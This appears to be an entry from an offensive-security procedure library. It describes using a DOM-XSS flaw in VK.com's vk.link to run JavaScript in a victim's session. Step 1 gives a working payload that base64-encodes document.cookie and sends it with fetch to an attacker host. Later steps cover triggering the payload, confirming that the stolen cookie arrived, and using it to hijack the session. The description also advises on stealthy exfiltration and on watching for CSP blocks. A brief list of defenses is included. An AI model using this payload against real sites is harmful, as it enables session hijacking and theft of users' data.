---
id: proc-vk-execute-exfil
tags:
  - xss
  - exfiltration
  - data-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:24.383Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute Script and Exfiltrate Data

## Summary

This procedure executes the injected JavaScript via DOM-XSS in vk.link to access victim data like cookies and exfiltrate it to an attacker server, enabling session hijacking.

## Description

Post-delivery, the payload runs in the victim's VK.com session, accessing DOM-stored data. Low severity as it requires user interaction and is browser-confined. From the 2020 report, resolution involved JS sanitization. Use fetch or img src for stealthy exfil; monitor for CSP blocks.

## Requirements

1. Attacker server (e.g., simple HTTP listener)
2. Knowledge of VK.com's session storage
3. HTTPS for exfil to avoid mixed content blocks

## Defense

Defensive measures and detection strategies:

- HttpOnly and Secure flags on cookies
- Monitor outbound requests from JS
- Browser extensions for XSS blocking

## Objectives

1. Run arbitrary JS in victim context
2. Extract session or personal data
3. Transmit to attacker without detection

## Instructions

### Step 1: Inject Exfil Payload

**Context**: Modify payload for data theft.

Payload: fetch('https://attacker.com/log?cookie='+btoa(document.cookie)). No visible output.

> Encodes data for safe transmission.

### Step 2: Trigger Execution

**Context**: Victim loads the link.

Upon vk.link processing, JS executes, sending request to attacker server.

> Expected: Server receives base64-encoded cookie.

### Step 3: Validate Exfiltration

**Context**: Confirm data receipt.

Check server logs for incoming POST/GET with victim data.

> Success: Decoded data usable for hijacking.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[Exfiltration]]
- [[session-hijacking]]
